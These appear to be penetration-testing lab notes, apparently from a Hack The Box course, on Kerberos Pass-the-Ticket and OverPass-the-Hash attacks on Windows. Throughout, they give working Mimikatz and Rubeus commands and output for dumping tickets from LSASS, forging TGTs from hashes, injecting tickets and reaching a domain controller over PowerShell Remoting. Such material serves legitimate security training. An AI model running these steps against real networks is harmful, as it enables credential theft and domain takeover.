# Pass the Ticket (PtT) from Windows - Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. 
Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-
administrative user, you can only get your own tickets, but as a local admin you can collect everything.

Using the `Mimikatz` module `sekurlsa::tickets /export` we can dump all of the available tickets on a machine, 
giving us `.kirbi` files.

```
c:\tools> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 329278 (00000000:0005063e)
Session           : Network from 0
User Name         : DC01$
Domain            : HTB
Logon Server      : (null)
Logon Time        : 7/12/2022 9:39:55 AM
SID               : S-1-5-18

         * Username : DC01$
         * Domain   : inlanefreight.htb
         * Password : (null)
         
        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : DC01$ ; @ inlanefreight.htb
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !

        Group 2 - Ticket Granting Ticket

<SNIP>

mimikatz # exit
Bye!
c:\tools> dir *.kirbi

Directory: c:\tools

Mode                LastWriteTime         Length Name
----                -------------         ------ ----

<SNIP>

-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

<SNIP>
```

The tickets ending with `$` correspond to a local computer account, which needs a ticket to interact with AD. User 
ticekts that have a username follwed by an `@` that seperates the service name and domain, for example: 
`[randomvalue]-username@service-domain.local.kirbi`

Note, that if you picket a ticket with the service krbtgt, it corresponds to the TGT of that account. At the time 
of writing, using Mimikatz 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des-cbc-md4 on 
some versions of Windows 10. 

Exported tickets ((sekurlsa::tickets /export)) do not work correctly because of this wrong encryption. 
It's possible to use these hashes to generate new tickets or use Rubeus to export tickets in b64 format.

## Pass the Key or OverPass the Hash

```
Mimikatz.exe

privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:XXXXXXXXXXX

rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:XXXXXXXXXX
```

To learn more about the difference between Mimikatz `sekurlsa::pth` and Rubeus `asktgt`, consult the Rubeus tool 
documentation: https://github.com/GhostPack/Rubeus#example-over-pass-the-hash

Note that modern Windows domains (functional level 2008 and above) use AES encryption by default in normal 
Kerberos exchange. If we use a rc4_hmac(NTLM) hash in a Kerberos exchange it may be detected as an `encryption 
downgrade` and might get flagged.

## Pass the Ticket (PtT)

With the tickets we have we can start to move laterally. With Rubeus we performed an OverPass the Hash attack and 
retrieved a TGT in base64, but instead we could use the flag /ptt to simply submit the ticket to the current login 
session:

```
rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:xxxxxxxxxxxxxxxxxxxxxxx /ptt
```
```
rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
```
[Convert]::TosBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@inlanefreight.htb.kirbi"))
```

Using Rubeus, we can perform a Pass the Ticket providing the b64 string instead of a filename. Finally, we can 
also perform the PtT attack using the Mimikatz module `kerberos::ptt` and the .kirbi file that contains the ticket 
we want to import.

```
mimikatz.exe
privilege::debug

kerberos::ptt "C:\Users\plaintext\Desktop\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit

dir \\DC01.inlanefreight.htb\c$
<SNIP>
```

Note that, instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command 
prompt, we can use the Mimikatz module `misc` to launch a new window with the imported ticket using `misc::cmd`.

## Pass the Ticket with Powershell Remoting

The standard port for HTTP/HTTPS POSH Remoting listeners are on TCP/5985 for HTTP and TCP/5986 for HTTPS.

## POSH Remoting with Mimikatz PtT

```
mimikatz.exe
privilege::debug

kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

powershell
Enter-PSSession -ComputerName DC01
```

## Rubeus POSH Remoting with PtT

Reubeus has the option `createnetonly`, which creates a sacrificial process/logon session(Logon type 9). The 
process is hidden by default, but we can specify the flag `/show` to display the process and the result is the 
equivilent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with 
the option `/ptt` to import the ticket into our current session and connect to the DC using PSRemoting.

```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /
aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

powershell -> Enter-PSSession ...
```


